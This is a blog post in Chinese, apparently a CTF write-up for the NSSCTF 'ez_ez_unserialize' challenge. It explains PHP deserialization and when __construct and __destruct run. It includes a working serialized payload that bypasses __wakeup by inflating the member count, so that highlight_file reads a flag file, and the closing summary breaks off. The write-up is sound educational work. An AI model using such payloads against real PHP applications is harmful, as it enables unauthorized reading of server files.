@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>由NSSCTF-SWPUCTF-ez_ez_unserialize，对反序列具体详细过程以及对__construct，__destruct函数执行情况的具体分析 | 章小豫的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="前置知识： 12345678910111，php中__FILE__是什么意思，php中__FILE__是一个魔术常量，它会返回当前执行PHP脚本的完整路径和文件名。自PHP 4.0.2版本起，它总是包含一个绝对路径。2,__wakeup()说明，unserialize()会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup() 方法3，__wakeup()魔术方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="由NSSCTF-SWPUCTF-ez_ez_unserialize，对反序列具体详细过程以及对__construct，__destruct函数执行情况的具体分析">
+<meta property="og:url" content="http://example.com/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/index.html">
+<meta property="og:site_name" content="章小豫的博客">
+<meta property="og:description" content="前置知识： 12345678910111，php中__FILE__是什么意思，php中__FILE__是一个魔术常量，它会返回当前执行PHP脚本的完整路径和文件名。自PHP 4.0.2版本起，它总是包含一个绝对路径。2,__wakeup()说明，unserialize()会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup() 方法3，__wakeup()魔术方法">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/2.png">
+<meta property="og:image" content="http://example.com/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/3.png">
+<meta property="og:image" content="http://example.com/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/6.png">
+<meta property="og:image" content="http://example.com/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/5.png">
+<meta property="article:published_time" content="2022-10-20T10:00:30.000Z">
+<meta property="article:modified_time" content="2022-10-21T03:21:58.357Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/2.png">
+  
+    <link rel="alternate" href="/atom.xml" title="章小豫的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">章小豫的博客</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-NSSCTF-SWPUCTF-ez-ez-unserialize" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/" class="article-date">
+  <time class="dt-published" datetime="2022-10-20T10:00:30.000Z" itemprop="datePublished">2022-10-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      由NSSCTF-SWPUCTF-ez_ez_unserialize，对反序列具体详细过程以及对__construct，__destruct函数执行情况的具体分析
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>前置知识：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1，php中__FILE__是什么意思，</span><br><span class="line">php中__FILE__是一个魔术常量，它会返回当前执行PHP脚本的完整路径和文件名。自PHP 4.0.2版本起，它总是包含一个绝对路径。</span><br><span class="line"></span><br><span class="line">2,__wakeup()说明，</span><br><span class="line">unserialize()会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup() 方法</span><br><span class="line"></span><br><span class="line">3，__wakeup()魔术方法绕过，</span><br><span class="line">php版本为PHP5&lt;5.6.25，PHP7 &lt; 7.0.10时，只要序列化的中的成员数大于实际成员数，即可绕过该魔法函数，比如一个ctf的类序列化后是   </span><br><span class="line">O:3:&quot;ctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">把成员数&quot;1&quot;，改为&quot;2&quot;即可绕过，更改之后为</span><br><span class="line">O:3:&quot;ctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入靶场，发现是一个反序列化题目，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span> = <span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$x</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;x = <span class="variable">$x</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;x !== <span class="keyword">__FILE__</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;x = <span class="keyword">__FILE__</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">        <span class="comment">//flag is in fllllllag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>])) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先说下我当时的想法，就是一看到__wakeup()，八成是要绕过它的，然后危险函数是highlight_file()，只需要把里面的变量换为flag的绝对路径，然后将序列化后的字符中路径修改为靶机flag文件的绝对路径，接着再修改成员数（必须大于当前真实的成员数目），提交参数就可以了。</p>
+<p>编写poc，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span> = <span class="keyword">__FILE__</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">X</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<p>运行结果为，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:37:&quot;D:\桌面\工具\php\teacher.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>百度搜下linux的www文件目录一般是什么，</p>
+<p><img src="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/2.png"></p>
+<p>那么把目录修改下，最终的payload为，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;X&quot;:2:&#123;s:1:&quot;x&quot;;s:27:&quot;/var/www/html/fllllllag.php&quot;;&#125;</span><br><span class="line">//注意目录改变后，需要将目录的长度修改为当前实际长度27（原来是37）</span><br><span class="line">//因为要绕过__wakeup()，需要将成员数1修改为2（任何大于1的都可以）</span><br></pre></td></tr></table></figure>
+
+<p>提交成功，flag浮现，</p>
+<p><img src="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/3.png"></p>
+<hr>
+<hr>
+<p> <strong>写一个题目的目的不仅仅是找到正确flag得分，更重要的是从这个题目中学到了些什么知识</strong></p>
+<p>这个题目我只是依靠经验做出来了，但是如果让我具体分析</p>
+<p>1，为什么要绕过<code>__wakeup()</code>，不绕过为什么不行？</p>
+<p>2，为什么提交payload后不是显示的是<code>x = __FILE__;</code>的源码？触发__construct()函数不是会将$x赋值为当前文件件绝对路径吗？我说不出来……</p>
+<hr>
+<hr>
+<p>所以在提交完正确的flag后，我也是想到了刚才说的两个问题，于是乎再研究了一下，现在回答下这两个问题。</p>
+<p>先了解一下反序列化具体过程，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>() 对单一的已序列化的变量进行操作，将其转换回 php 的值。在解序列化一个对象前，这个对象的类必须在解序列化之前定义。 </span><br><span class="line">简单来理解起来就算将序列化过存储到文件中的数据，恢复到程序代码的变量表示形式的过程，恢复到变量序列化之前的结果。</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">file_get_contents</span>(‘./目标文本文件<span class="string">&#x27;); //取得文本文件的内容（之前序列化过的字符串）</span></span><br><span class="line"><span class="string">$变量 = unserialize($s); //将该文本内容，反序列化到指定的变量中</span></span><br></pre></td></tr></table></figure>
+
+<p>通过一个例子来了解反序列化：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printdata</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;user &#x27;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&#x27; is &#x27;</span>.<span class="variable language_">$this</span>-&gt;age.<span class="string">&#x27; years old. &lt;br /&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重建对象</span></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;user&quot;:2:&#123;s:3:&quot;age&quot;;i:10;s:4:&quot;name&quot;;s:4:&quot;tome&quot;;&#125;&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">printdata</span>();</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过源码知道，虽然没有创建类user的对象，但是反序列化之后，可以直接调用$user中的printdata()方法。那么问题来了，unserialize()函数返回的是个什么东东，为什么可以当对象使用？</p>
+<p>在本地测试一下，</p>
+<p><img src="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/6.png"></p>
+<p>发现unserialize()函数返回值是类user的一个实例对象，其中对象里变量$age，$name的值是序列化字符串里对应的，10，tome。</p>
+<p>简单说，不管类中变量是什么，构造的序列化字符串里变量的值是什么，反序列化后创建的该类对象里的变量值就是什么。</p>
+<p>上述代码运行结果如下，</p>
+<p><img src="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/5.png"></p>
+<p>验证了上述猜测。</p>
+<p>我还有个疑问，就是<code>__construct()，__destruct()</code>这两个函数什么情况下被触发？以前都是看的比较专业的语言说明的，也没看太懂。</p>
+<p>通过下面例子可以更明白两个函数被触发的情况，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct()!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct()!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;000\n&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;111\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;222\n&quot;</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$class</span>);</span><br></pre></td></tr></table></figure>
+
+<p>输出，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__construct()!!!000</span><br><span class="line">111</span><br><span class="line">222</span><br><span class="line">__destruct()!!!__destruct()!!!</span><br></pre></td></tr></table></figure>
+
+<p>去掉unset()函数，再试下没有该函数，会不会触发<code>__destruct()</code>函数？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct()!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct()!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;000\n&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;111\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;222\n&quot;</span>;</span><br><span class="line"><span class="comment">//unset($class);</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果，还是一样的，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__construct()!!!000</span><br><span class="line">111</span><br><span class="line">222</span><br><span class="line">__destruct()!!!__destruct()!!!</span><br></pre></td></tr></table></figure>
+
+
+
+<p>（1）	 <strong>说明<code>__construct()</code>会在创建对象的时候(<code>$class = new TestClass();</code>)被触发，但是反序列化时<code>$b = unserialize($a);</code>，不会被触发。</strong></p>
+<p>为什么反序列化返回了一个对象，但是不会触发<code>__construct()</code>呢？下面是我的一些理解，有不正确的地方请各位大佬批评指正，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">虽然有对象被创建，但是因为unserialize函数不一定返回的是对象，可返回 integer、float、string、array 或 object。</span><br><span class="line">如果反序列化返回的不是一个对象，那么__construct()就不会被触发， 而integer、float、string、array这些数据类型应该是一样的。</span><br><span class="line">所以反序列化返回的是一个对象时，也不会触发__construct()。</span><br><span class="line">因此可以理解为什么反序列化对象字符为对象的时候，虽然有对象被创建，甚至可以调用返回对象中的函数，但是并不会触发__construct()函数</span><br></pre></td></tr></table></figure>
+
+
+
+<p>（2）	<strong>说明<code>__destruct()</code>会在代码执行完成后被触发一次，因为在php中，程序在运行结束后，会自动的销毁对象！这时会触发destruct()函数。反序列化完成时会触发一次(我理解的是销毁对象)，所以才输出两个<code>__destruct()!!!</code>。</strong></p>
+<p>反序列化完成时会触发<code>__destruct()</code>函数一次(我理解的是销毁对象)，这个怎么理解呢，直接上代码说明，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct()!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="comment">//$b = unserialize($a);</span></span><br><span class="line"><span class="comment">//没有反序列化的情况下，输出__destruct()!!!</span></span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct()!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//有反序列的情况下，输出__destruct()!!!__destruct()!!!</span></span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<hr>
+<p>最后总的来梳理一下题目反序列化时的过程，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1，输入序列化后的字符，提交后，执行unserialize()函数之前，先检查类里是否有__wakeup()函数，//这时不会触发__construct()函数</span><br><span class="line">2，</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/" data-id="cl9hxjpfw001578v4154h6cer" data-title="由NSSCTF-SWPUCTF-ez_ez_unserialize，对反序列具体详细过程以及对__construct，__destruct函数执行情况的具体分析" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/10/19/NSWSTAR-week2-UnserializeOne/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">NSWSTAR-week2-UnserializeOne</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%89%8D%E7%AB%AF/">web前端</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">十月 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/">由NSSCTF-SWPUCTF-ez_ez_unserialize，对反序列具体详细过程以及对__construct，__destruct函数执行情况的具体分析</a>
+          </li>
+        
+          <li>
+            <a href="/2022/10/19/NSWSTAR-week2-UnserializeOne/">NSWSTAR-week2-UnserializeOne</a>
+          </li>
+        
+          <li>
+            <a href="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/">NSSCTF-HNCTF-[Week1]Challenge__rce</a>
+          </li>
+        
+          <li>
+            <a href="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/">CTFHUB-SSRF-端口扫描</a>
+          </li>
+        
+          <li>
+            <a href="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/">CTFHUB-SSRF-伪协议读取文件</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
